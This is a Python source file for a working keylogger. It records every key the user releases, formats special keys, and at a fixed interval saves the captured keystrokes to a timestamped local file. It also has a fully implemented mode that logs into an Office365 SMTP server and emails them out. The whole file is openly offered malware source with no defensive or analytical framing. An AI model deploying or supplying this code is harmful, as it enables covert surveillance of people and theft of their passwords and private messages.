import keyboard # for keylogs
import smtplib # for sending emails using SMTP protocol (gmail)
# Timer to run a method after certain interval
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 # seconds
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""

class Keylogger:
    
    def __init__(self, interval, report_method="email"):
        
        # will pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method

        # variable that contains log of all key strokes
        self.log = ""

        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):

        # this callback is invoked whenever a key is released

        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g. CTRL, ALT etc.)
            # uppercase with []
            if name == "space":
                # " " instead of space
                name = " "
            elif name == "enter":
                # add a new line whenever ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        self.log += name

    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # this method creates the log file in the current directory
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        """Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version to be emailed"""

        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"

        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        # after creating email, convert it to string message
        return msg.as_string()
    
    def sendmail(self, email, password, message, verbose=1):
        # manages connection to an SMTP server
        # in this case, it is for Microsoft 365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp.office365.com", port=587)

        # connect to SMTP server as TLS mode (for security)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        
        # terminate the session
        server.quit()

        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
    
    def report(self):
        # sends keylogs & resets self.log variable

        if self.log:
            #if there is something in log, report it
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # comment out the below line if console doesn't have to be printed
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)

        # set the thread as daemon (dies when main thread dies)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        
        # start the keylogger
        keyboard.on_release(callback=self.callback)

        self.report()
        print(f"{datetime.now()} - Started keylogger")

        # block the current thread, wait until CTRL + C is pressed
        keyboard.wait()

if __name__ == "__main__":

    # to send email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    
    # Record keylogs in local file
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()